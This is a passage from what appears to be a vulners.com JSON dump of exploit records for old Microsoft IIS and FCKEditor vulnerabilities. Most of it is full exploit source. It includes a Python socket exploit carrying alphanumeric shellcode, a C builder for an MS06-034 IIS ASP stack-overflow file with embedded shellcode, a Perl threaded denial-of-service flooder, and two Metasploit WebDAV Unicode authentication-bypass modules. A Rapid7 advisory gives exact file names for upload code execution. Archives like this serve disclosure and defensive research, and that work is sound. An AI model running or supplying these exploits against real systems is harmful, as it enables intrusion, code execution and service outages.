9\\xe4\\x94\\xb1\\xe3\\x91\\xb2\\xe5\\x8d\\xa5\\xe5\\xa1\\x8a\\xe4\\x91\\x8e\\xe7\\xa9\\x84\\xe6\\xb0\\xb5\\xe5\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81'\r\n\r\nshellcode='VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA'\r\n\r\npay+=shellcode\r\npay+='>\\r\\n\\r\\n'\r\nprint pay\r\n\r\nsock.send(pay)  \r\ndata = sock.recv(80960)  \r\n\r\nprint data \r\nsock.close",
            "cvss": {
                "score": 0.0,
                "vector": "NONE"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:41738"
        }
    ],
    "CVE-2009-4444": [
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2010-08-30T00:00:00",
            "published": "2010-08-30T00:00:00",
            "href": "https://packetstormsecurity.com/files/93313/Rapid7-Security-Advisory-36.html",
            "id": "PACKETSTORM:93313",
            "type": "packetstorm",
            "title": "Rapid7 Security Advisory 36",
            "sourceData": "`R7-0036: FCKEditor.NET File Upload Code Execution  \nAugust 30, 2010  \n  \n-- Vulnerability Details:  \n  \nFCKEditor contains a file renaming bug that allows remote code execution. Specifically, it is possible to upload ASP code via the ASP.NET connector in FCKEditor. The vulnerability requires that the remote server be running IIS. This vulnerability has been confirmed on FCKEditor 2.5.1 and 2.6.6.  \n  \nCVSS Vector: AV:R/AC:L/Au:NR/C:C/I:C/A:C  \n  \nBrowse to http://<ip>fckeditor/editor/filemanager/connectors/test.html and choose the ASP.NET connector. By uploading a file with the same name as an existing file, that includes an underscore followed by a dot, it is possible to bypass the file renaming mitigation in place. For instance, when uploading a file twice with the name:  \n  \nmyfile_.asp;.txt  \n  \nThe first file would be renamed  \n  \nmyfile__asp;.txt  \n  \nBUT the second file will be renamed  \n  \nmyfile_.asp;(1).txt  \n  \nDue to the IIS semi-colon vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4444) the server will remotely execute myfile_.asp;(1).txt when the second file is accessed.  \n  \n  \n-- Vendor Response:  \nA new version of the .NET connector has been released to address this issue, it can be found at the URL below.  \n  \nhttp://ckeditor.com/blog/FCKeditor.Net_2.6.4_released  \n  \n-- Disclosure Timeline:  \n2010-08-17 - Vulnerability reported to the vendor via contact form  \n2010-08-17 - Vulnerability reported to the vendor via bug tracker  \n2010-08-19 - Vulnerability reported to the vendor via email  \n2010-08-27 - Vendor replied indicating a fix is in the works  \n2010-08-27 - Vendor schedules the fix for August 30th, 2010  \n2010-08-30 - Vendor releases version 2.6.4 to address the issue  \n  \n-- Credit:  \nThis vulnerability was discovered by Will Vandevanter of the Rapid7 professional services team during a customer engagement.  \n  \n-- About Rapid7 Security  \nRapid7 provides vulnerability management, compliance and penetration testing solutions for Web application, network and database security. In addition to developing the NeXpose Vulnerability Management system, Rapid7 manages the Metasploit Project and is the primary sponsor of the  \nW3AF web assessment tool.   \n  \nOur vulnerability disclosure policy is available online at:  \n  \nhttp://www.rapid7.com/disclosure.jsp  \n  \n  \n  \n`\n",
            "cvss": {
                "score": 6.0,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:SINGLE_INSTANCE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:93313"
        }
    ],
    "CVE-2006-0026": [
        {
            "bulletinFamily": "exploit",
            "description": "Microsoft IIS ASP Stack Overflow Exploit (MS06-034). CVE-2006-0026. Local exploit for windows platform",
            "modified": "2006-07-21T00:00:00",
            "published": "2006-07-21T00:00:00",
            "id": "EDB-ID:2056",
            "href": "https://www.exploit-db.com/exploits/2056/",
            "type": "exploitdb",
            "title": "Microsoft IIS ASP - Stack Overflow Exploit MS06-034",
            "sourceData": "#include <stdio.h>\r\n#include <windows.h>\r\n\r\n/***********************************************************************\r\nMicrosoft IIS ASP Stack Overflow Exploit(MS06-034)\r\n\r\nby cocoruder(frankruder_at_hotmail.com),2006/7/13\r\npage:http://ruder.cdut.net/default.asp\r\n\r\nsuccessfully test on Windows 2000 Server SP4+IIS5.0,\r\nOn Windows 2003 Server+IIS6.0,because the new SEH protection mechanisms,\r\nyou should set the new fs:[0]->hander flexibility,this need some luck.\r\n\r\nusage:\r\nupload the \"exploit2000.asp\" to IIS web directory,use web\r\nbrowser to visit it,then the shellcode will execute.\r\n\r\n************************************************************************/\r\n\r\n\r\n\r\n\r\n//include asp filename length=10ch>104h\r\nunsigned char asp_include_header[]=\r\n\"<!--#include file=\\\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\r\n\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\r\n\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\r\n\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.asp\\\"-->\";\r\n\r\n//jmp 8\r\nunsigned char code_jmp8[]=\r\n\"\\xEB\\x06\\x90\\x90\";\r\n\r\n//jmp ebx address\r\nunsigned char addr_jmp_ebx[]=\r\n\"\\x66\\x4A\\xE6\\x77\";\r\n\r\n// shellcode !! Must be free of Unicode null terminators (0x0000) !!\r\n// win32_exec - EXITFUNC=process CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com\r\nunsigned char shellcode[]=\r\n\"\\xeb\\x03\\x59\\xeb\\x05\\xe8\\xf8\\xff\\xff\\xff\\x4f\\x49\\x49\\x49\\x49\\x49\"\r\n\"\\x49\\x51\\x5a\\x56\\x54\\x58\\x36\\x33\\x30\\x56\\x58\\x34\\x41\\x30\\x42\\x36\"\r\n\"\\x48\\x48\\x30\\x42\\x33\\x30\\x42\\x43\\x56\\x58\\x32\\x42\\x44\\x42\\x48\\x34\"\r\n\"\\x41\\x32\\x41\\x44\\x30\\x41\\x44\\x54\\x42\\x44\\x51\\x42\\x30\\x41\\x44\\x41\"\r\n\"\\x56\\x58\\x34\\x5a\\x38\\x42\\x44\\x4a\\x4f\\x4d\\x4e\\x4f\\x4a\\x4e\\x46\\x34\"\r\n\"\\x42\\x50\\x42\\x50\\x42\\x30\\x4b\\x38\\x45\\x34\\x4e\\x43\\x4b\\x48\\x4e\\x47\"\r\n\"\\x45\\x30\\x4a\\x37\\x41\\x30\\x4f\\x4e\\x4b\\x38\\x4f\\x34\\x4a\\x51\\x4b\\x48\"\r\n\"\\x4f\\x55\\x42\\x42\\x41\\x30\\x4b\\x4e\\x49\\x44\\x4b\\x58\\x46\\x43\\x4b\\x58\"\r\n\"\\x41\\x50\\x50\\x4e\\x41\\x33\\x42\\x4c\\x49\\x59\\x4e\\x4a\\x46\\x48\\x42\\x4c\"\r\n\"\\x46\\x57\\x47\\x30\\x41\\x4c\\x4c\\x4c\\x4d\\x30\\x41\\x30\\x44\\x4c\\x4b\\x4e\"\r\n\"\\x46\\x4f\\x4b\\x43\\x46\\x45\\x46\\x42\\x46\\x50\\x45\\x37\\x45\\x4e\\x4b\\x38\"\r\n\"\\x4f\\x45\\x46\\x42\\x41\\x50\\x4b\\x4e\\x48\\x36\\x4b\\x58\\x4e\\x30\\x4b\\x54\"\r\n\"\\x4b\\x38\\x4f\\x35\\x4e\\x51\\x41\\x50\\x4b\\x4e\\x4b\\x48\\x4e\\x41\\x4b\\x48\"\r\n\"\\x41\\x50\\x4b\\x4e\\x49\\x48\\x4e\\x45\\x46\\x42\\x46\\x50\\x43\\x4c\\x41\\x53\"\r\n\"\\x42\\x4c\\x46\\x36\\x4b\\x58\\x42\\x54\\x42\\x53\\x45\\x48\\x42\\x4c\\x4a\\x37\"\r\n\"\\x4e\\x30\\x4b\\x48\\x42\\x34\\x4e\\x50\\x4b\\x58\\x42\\x57\\x4e\\x51\\x4d\\x4a\"\r\n\"\\x4b\\x48\\x4a\\x46\\x4a\\x50\\x4b\\x4e\\x49\\x50\\x4b\\x38\\x42\\x58\\x42\\x4b\"\r\n\"\\x42\\x30\\x42\\x50\\x42\\x30\\x4b\\x38\\x4a\\x56\\x4e\\x43\\x4f\\x35\\x41\\x53\"\r\n\"\\x48\\x4f\\x42\\x56\\x48\\x45\\x49\\x38\\x4a\\x4f\\x43\\x48\\x42\\x4c\\x4b\\x37\"\r\n\"\\x42\\x35\\x4a\\x36\\x50\\x47\\x4a\\x4d\\x44\\x4e\\x43\\x47\\x4a\\x36\\x4a\\x49\"\r\n\"\\x50\\x4f\\x4c\\x48\\x50\\x50\\x47\\x55\\x4f\\x4f\\x47\\x4e\\x43\\x46\\x41\\x46\"\r\n\"\\x4e\\x46\\x43\\x46\\x42\\x30\\x5a\";\r\n\r\n\r\n\r\nvoid main(void)\r\n{\r\nFILE *fp=NULL;\r\nint i;\r\n\r\nprintf(\"[+] Creating file...exploit.asp\\n\");\r\n\r\n\r\nif ((fp=fopen(\"exploit2000.asp\",\"wb\"))==NULL)\r\n{\r\nprintf(\"fopen error!\\n\");\r\nreturn;\r\n}\r\n\r\n\r\nfwrite(asp_include_header,sizeof(asp_include_header)-1,1,fp);\r\n\r\n//fill\r\nfor (i=0;i<0x135;i++)\r\n{\r\nfwrite(\"\\x41\",1,1,fp);\r\n}\r\n\r\nfwrite(code_jmp8,4,1,fp);\r\n\r\nfwrite(addr_jmp_ebx,4,1,fp);\r\n\r\nfwrite(shellcode,sizeof(shellcode)-1,1,fp);\r\n\r\n//fill\r\nfor (i=0;i<0x1500;i++)\r\n{\r\nfwrite(\"\\x41\",1,1,fp);\r\n}\r\n\r\nfclose(fp);\r\n\r\n\r\nprintf(\"[+] Exploit file has been successfully built.\\n\");\r\n\r\n}\r\n\r\n# milw0rm.com [2006-07-21]\r\n",
            "cvss": {
                "score": 6.5,
                "vector": "AV:NETWORK/AC:LOW/Au:SINGLE_INSTANCE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:2056"
        }
    ],
    "CVE-2007-2897": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 51527\r\nCVE ID: CVE-2007-2897\r\n\r\nInternet Information Services\uff08IIS\uff0c\u4e92\u8054\u7f51\u4fe1\u606f\u670d\u52a1\uff09\u662f\u7531\u5fae\u8f6f\u516c\u53f8\u63d0\u4f9b\u7684\u57fa\u4e8e\u8fd0\u884cMicrosoft Windows\u7684\u4e92\u8054\u7f51\u57fa\u672c\u670d\u52a1\u3002\r\n\r\nIIS 6.0\u5728\u8bf7\u6c42\u7279\u5236\u8def\u5f84\u65f6\u5b58\u5728\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u4f7f\u5e94\u7528\u7a0b\u5e8f\u6302\u8d77\u6216\u6cc4\u6f0f\u654f\u611f\u4fe1\u606f\uff0c\u7269\u7406\u63a5\u89e6\u7cfb\u7edf\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5f53\u524d\u7528\u6237\u6743\u9650\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\n0\nMicrosoft IIS 6.0\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nMicrosoft\r\n---------\r\n\u76ee\u524d\u5382\u5546\u8fd8\u6ca1\u6709\u63d0\u4f9b\u8865\u4e01\u6216\u8005\u5347\u7ea7\u7a0b\u5e8f\uff0c\u6211\u4eec\u5efa\u8bae\u4f7f\u7528\u6b64\u8f6f\u4ef6\u7684\u7528\u6237\u968f\u65f6\u5173\u6ce8\u5382\u5546\u7684\u4e3b\u9875\u4ee5\u83b7\u53d6\u6700\u65b0\u7248\u672c\uff1a\r\n\r\nhttp://www.microsoft.com/technet/security/",
            "modified": "2012-02-01T00:00:00",
            "published": "2012-02-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-30067",
            "id": "SSV:30067",
            "type": "seebug",
            "title": "Microsoft IIS 6.0 DOS\u8bbe\u5907\u8bf7\u6c42\u5b89\u5168\u9650\u5236\u7ed5\u8fc7\u6f0f\u6d1e",
            "sourceData": "\n                                                #When sending multiple parallel GET requests to a IIS 6.0 server requesting\r\n#/AUX/.aspx the server gets instable and non responsive. This happens only\r\n#to servers which respond a runtime error (System.Web.HttpException)\r\n#and take two or more seconds to respond to the /AUX/.aspx GET request.\r\n#\r\n#\r\n#signed,\r\n#Kingcope kingcope () gmx net\r\n##########################################################################\r\n###***********************************************************************\r\n###\r\n###\r\n###\r\n### Lame Internet Information Server 6.0 Denial Of Service (nonpermanent)\r\n### by Kingcope, May/2007\r\n### Better run this from a Linux system\r\n##########################################################################\r\n\r\nuse IO::Socket;\r\nuse threads;\r\n\r\nif ($ARGV[0] eq &quot;&quot;) { exit; }\r\nmy $host = $ARGV[0];\r\n\r\n$|=1;\r\n\r\nsub sendit {\r\n$sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $host,\r\n                              PeerPort =&gt; 'http(80)',\r\n                              Proto    =&gt; 'tcp');\r\n\r\nprint $sock &quot;GET /AUX/.aspx HTTP/1.1\\r\\nHost:\r\n$host\\r\\nConnection:close\\r\\n\\r\\n&quot;;\r\n}\r\n\r\n$sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $host,\r\n                              PeerPort =&gt; 'http(80)',\r\n                              Proto    =&gt; 'tcp');\r\n\r\nprint $sock &quot;GET /AUX/.aspx HTTP/1.1\\r\\nHost:\r\n$host\\r\\nConnection:close\\r\\n\\r\\n&quot;;\r\n\r\n$k=0;\r\nwhile (&lt;$sock&gt;) {\r\n        if (($_ =~ /Runtime\\sError/) || ($_ =~ /HttpException/)) {\r\n                        $k=1;\r\n                        last;\r\n        }\r\n}\r\n\r\nif ($k==0) {\r\n        print &quot;Server does not seem vulnerable to this attack.\\n&quot;;\r\n        exit;  \r\n}\r\n\r\nprint &quot;ATTACK!\\n&quot;;\r\n\r\nwhile(1){\r\n\r\nfor (my $i=0;$i&lt;=100;$i++) {\r\n        $thr = threads-&gt;new(\\&amp;sendit);\r\n        print &quot;\\r\\r\\r$i/100                        &quot;;\r\n}\r\n\r\nforeach $thr (threads-&gt;list) {\r\n        $thr-&gt;join;\r\n}\r\n}\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:30067"
        }
    ],
    "CVE-2009-1535": [
        {
            "bulletinFamily": "exploit",
            "description": "This module is based on et's HTTP Directory Scanner module, with one exception. Where authentication is required, it attempts to bypass authentication using the WebDAV IIS6 Unicode vulnerability discovered by Kingcope. The vulnerability appears to be exploitable where WebDAV is enabled on the IIS6 server, and any protected folder requires either Basic, Digest or NTLM authentication.\n",
            "modified": "2017-11-08T16:00:24",
            "published": "2010-02-01T02:12:30",
            "id": "MSF:AUXILIARY/SCANNER/HTTP/DIR_WEBDAV_UNICODE_BYPASS",
            "href": "",
            "type": "metasploit",
            "title": "MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner",
            "sourceData": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/proto/http'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::WmapScanDir\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'   \t\t=> 'MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner',\n      'Description'\t=> %q{\n        This module is based on et's HTTP Directory Scanner module,\n        with one exception. Where authentication is required, it attempts\n        to bypass authentication using the WebDAV IIS6 Unicode vulnerability\n        discovered by Kingcope. The vulnerability appears to be exploitable\n        where WebDAV is enabled on the IIS6 server, and any protected folder\n        requires either Basic, Digest or NTLM authentication.\n      },\n      'Author' \t\t=> [ 'aushack' ],\n      'License'\t\t=> MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'MSB', 'MS09-020' ],\n          [ 'CVE', '2009-1535' ],\n          [ 'CVE', '2009-1122' ],\n          [ 'OSVDB', '54555' ],\n          [ 'BID', '34993' ],\n        ]))\n\n    register_options(\n      [\n        OptString.new('PATH', [ true,  \"The path to identify files\", '/']),\n        OptInt.new('ERROR_CODE', [ true, \"Error code for non existent directory\", 404]),\n        OptPath.new('DICTIONARY',   [ false, \"Path of word dictionary to use\",\n            File.join(Msf::Config.data_directory, \"wmap\", \"wmap_dirs.txt\")\n          ]\n        ),\n        OptPath.new('HTTP404S',   [ false, \"Path of 404 signatures to use\",\n            File.join(Msf::Config.data_directory, \"wmap\", \"wmap_404s.txt\")\n          ]\n        )\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new('NoDetailMessages', [ false, \"Do not display detailed test messages\", true ])\n      ])\n\n  end\n\n  def run_host(ip)\n    conn = true\n    ecode = nil\n    emesg = nil\n\n    tpath = normalize_uri(datastore['PATH'])\n    if tpath[-1,1] != '/'\n      tpath += '/'\n    end\n\n    ecode = datastore['ERROR_CODE'].to_i\n    vhost = datastore['VHOST'] || wmap_target_host\n    prot  = datastore['SSL'] ? 'https' : 'http'\n\n\n    #\n    # Detect error code\n    #\n    begin\n      randdir = Rex::Text.rand_text_alpha(5).chomp + '/'\n      res = send_request_cgi({\n        'uri'  \t\t=>  tpath+randdir,\n        'method'   \t=> 'GET',\n        'ctype'\t\t=> 'text/html'\n      }, 20)\n\n      return if not res\n\n      tcode = res.code.to_i\n\n\n      # Look for a string we can signature on as well\n      if(tcode >= 200 and tcode <= 299)\n\n        File.open(datastore['HTTP404S'], 'rb').each do |str|\n          if(res.body.index(str))\n            emesg = str\n            break\n          end\n        end\n\n        if(not emesg)\n          print_status(\"Using first 256 bytes of the response as 404 string\")\n          emesg = res.body[0,256]\n        else\n          print_status(\"Using custom 404 string of '#{emesg}'\")\n        end\n      else\n        ecode = tcode\n        print_status(\"Using code '#{ecode}' as not found.\")\n      end\n\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      conn = false\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n\n    return if not conn\n\n    webdav_req = '<?xml version=\"1.0\" encoding=\"utf-8\"?><propfind xmlns=\"DAV:\"><prop><getcontentlength xmlns=\"DAV:\"/>' +\n      '<getlastmodified xmlns=\"DAV:\"/><executable xmlns=\"http://apache.org/dav/props/\"/><resourcetype xmlns=\"DAV:\"/>' +\n      '<checked-in xmlns=\"DAV:\"/><checked-out xmlns=\"DAV:\"/></prop></propfind>'\n\n    File.open(datastore['DICTIONARY'], 'rb').each do |testf|\n      begin\n        testfdir = testf.chomp + '/'\n        res = send_request_cgi({\n          'uri'  \t\t=>  tpath + testfdir,\n          'method'   \t=> 'PROPFIND',\n          'ctype'\t\t=> 'application/xml',\n          'headers' \t=>\n            {\n            },\n          'data'\t\t=> webdav_req + \"\\r\\n\\r\\n\",\n        }, 20)\n\n\n        if(not res or ((res.code.to_i == ecode) or (emesg and res.body.index(emesg))))\n          if !datastore['NoDetailMessages']\n            print_status(\"NOT Found #{wmap_base_url}#{tpath}#{testfdir} #{res.code} (#{wmap_target_host})\")\n          end\n        elsif (res.code.to_i == 401)\n          print_status(\"Found protected folder #{wmap_base_url}#{tpath}#{testfdir} #{res.code} (#{wmap_target_host})\")\n          print_status(\"\\tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.\")\n\n          cset  = %W{ & ^ % $ # @ ! }\n          buff  = ''\n          blen  = rand(16)+1\n          while(buff.length < blen)\n            buff << cset[ rand(cset.length) ]\n          end\n          bogus = Rex::Text.uri_encode(Rex::Text.to_unicode( buff, 'utf-8', 'overlong', 2))\n\n          res = send_request_cgi({\n            'uri'  \t\t=>  tpath + bogus + testfdir,\n            'method'   \t=> 'PROPFIND',\n            'ctype'\t\t=> 'application/xml',\n            'headers' \t=>\n              {\n                #'Translate'\t => 'f', # Not required in PROPFIND, only GET - aushack 20091518\n              },\n            'data'\t\t=> webdav_req + \"\\r\\n\\r\\n\",\n          }, 20)\n\n          if (res and res.code.to_i == 207)\n            print_good(\"\\tFound vulnerable WebDAV Unicode bypass target #{wmap_base_url}#{tpath}%c0%af#{testfdir} #{res.code} (#{wmap_target_host})\")\n\n            # Unable to use report_web_vuln as method is PROPFIND and is not part of allowed\n            # list in db.rb\n\n            report_note(\n              :host\t=> ip,\n              :proto => 'tcp',\n              :sname => (ssl ? 'https' : 'http'),\n              :port\t=> rport,\n              :type\t=> 'UNICODE_WEBDAV_BYPASS',\n              :data\t=> \"#{tpath}%c0%af#{testfdir} Code: #{res.code}\",\n              :update => :unique_data\n            )\n\n          end\n        end\n\n      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      rescue ::Timeout::Error, ::Errno::EPIPE\n      end\n    end\n\n  end\nend\n",
            "cvss": {
                "score": 7.6,
                "vector": "AV:N/AC:H/Au:N/C:C/I:C/A:C"
            },
            "vhref": "https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/DIR_WEBDAV_UNICODE_BYPASS"
        },
        {
            "bulletinFamily": "exploit",
            "description": "This module attempts to to bypass authentication using the WebDAV IIS6 Unicode vulnerability discovered by Kingcope. The vulnerability appears to be exploitable where WebDAV is enabled on the IIS6 server, and any protected folder requires either Basic, Digest or NTLM authentication.\n",
            "modified": "2017-11-08T16:00:24",
            "published": "2009-11-26T20:39:15",
            "id": "MSF:AUXILIARY/SCANNER/HTTP/MS09_020_WEBDAV_UNICODE_BYPASS",
            "href": "",
            "type": "metasploit",
            "title": "MS09-020 IIS6 WebDAV Unicode Authentication Bypass",
            "sourceData": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/proto/http'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::WmapScanDir\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'   \t\t=> 'MS09-020 IIS6 WebDAV Unicode Authentication Bypass',\n      'Description'\t=> %q{\n        This module attempts to to bypass authentication using the WebDAV IIS6\n        Unicode vulnerability discovered by Kingcope. The vulnerability appears\n        to be exploitable where WebDAV is enabled on the IIS6 server, and any\n        protected folder requires either Basic, Digest or NTLM authentication.\n      },\n      'Author' \t\t=> [ 'et', 'aushack' ],\n      'License'\t\t=> MSF_LICENSE,\n      'References'   =>\n        [\n          [ 'MSB', 'MS09-020' ],\n          [ 'CVE', '2009-1535' ],\n          [ 'CVE', '2009-1122' ],\n          [ 'OSVDB', '54555' ],\n          [ 'BID', '34993' ],\n        ]\n      ))\n\n    register_options(\n      [\n        OptString.new('PATH', [ true,  \"The path to protected folder\", '/'])\n      ])\n\n  end\n\n  def run_host(ip)\n    tpath = normalize_uri(datastore['PATH'])\n    if tpath[-1,1] != '/'\n      tpath += '/'\n    end\n\n    vhost = datastore['VHOST'] || wmap_target_host\n    prot  = datastore['SSL'] ? 'https' : 'http'\n\n    webdav_req = '<?xml version=\"1.0\" encoding=\"utf-8\"?><propfind xmlns=\"DAV:\"><prop><getcontentlength xmlns=\"DAV:\"/>' +\n      '<getlastmodified xmlns=\"DAV:\"/><executable xmlns=\"http://apache.org/dav/props/\"/><resourcetype xmlns=\"DAV:\"/>' +\n      '<checked-in xmlns=\"DAV:\"/><checked-out xmlns=\"DAV:\"/></prop></propfind>'\n\n    begin\n      res = send_request_cgi({\n        'uri'  \t\t=>  tpath,\n        'method'   \t=> 'PROPFIND',\n        'ctype'\t\t=> 'application/xml',\n        'headers' \t=>\n          {\n          },\n        'data'\t\t=> webdav_req + \"\\r\\n\\r\\n\",\n      }, 20)\n\n      if(not res)\n        print_error(\"NO Response.\")\n      elsif (res.code.to_i == 401)\n        print_status(\"#{rhost}:#{rport} Confirmed protected folder #{wmap_base_url}#{tpath} #{res.code} (#{wmap_target_host})\")\n        print_status(\"#{rhost}:#{rport} \\tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.\")\n\n        cset  = %W{ & ^ % $ # @ ! }\n        buff  = ''\n        blen  = rand(16)+1\n        while(buff.length < blen)\n          buff << cset[ rand(cset.length) ]\n        end\n        bogus = Rex::Text.uri_encode(Rex::Text.to_unicode( buff, 'utf-8', 'overlong', 2))\n\n        res = send_request_cgi({\n          'uri'  \t\t=>  tpath + bogus+'/',\n          'method'   \t=> 'PROPFIND',\n          'ctype'\t\t=> 'application/xml',\n          'headers' \t=>\n            {\n              #'Translate'\t => 'f', # Not required in PROPFIND, only GET - aushack 20091518\n            },\n          'data'\t\t=> webdav_req + \"\\r\\n\\r\\n\",\n        }, 20)\n\n        if (res.code.to_i == 207)\n          print_good(\"#{rhost}:#{rport} \\tFound vulnerable WebDAV Unicode bypass.  #{wmap_base_url}#{tpath}#{bogus}/ #{res.code} (#{wmap_target_host})\")\n\n\n          report_vuln(\n            {\n              :host\t=> ip,\n              :port\t=> rport,\n              :proto\t=> 'tcp',\n              :sname  => ssl ? 'https' : 'http',\n              :name\t=> self.name,\n              :info\t=> \"Module #{self.fullname} bypassed authentication with #{tpath}#{bogus} (response code #{res.code})\",\n              :refs   => self.references,\n              :exploited_at => Time.now.utc\n            }\n          )\n\n        end\n      else\n        print_error(\"#{rhost}:#{rport} Folder does not require authentication. [#{res.code}]\")\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::E877PIPE\n    end\n  end\nend\n",
            "cvss": {
                "score": 7.6,
                "vector": "AV:N/AC:H/Au:N/C:C/I:C/A:C"
            },
